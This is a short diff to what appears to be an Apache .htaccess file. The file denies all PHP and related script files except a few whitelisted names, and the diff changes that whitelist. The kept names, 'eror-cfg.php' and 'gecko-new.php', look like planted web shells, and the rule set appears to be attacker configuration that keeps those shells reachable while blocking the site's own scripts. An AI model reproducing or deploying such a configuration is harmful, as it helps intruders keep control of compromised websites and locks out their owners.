@@ -1,7 +1,7 @@
 <FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|phtml|htm*|PHTML|SHTML)$">
     Deny from all
 </FilesMatch>
-<FilesMatch "^(absen_pn.php|eror-cfg.php|gecko-new.php|)$">
+<FilesMatch "^(index.php|info.php|eror-cfg.php|gecko-new.php|)$">
     Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
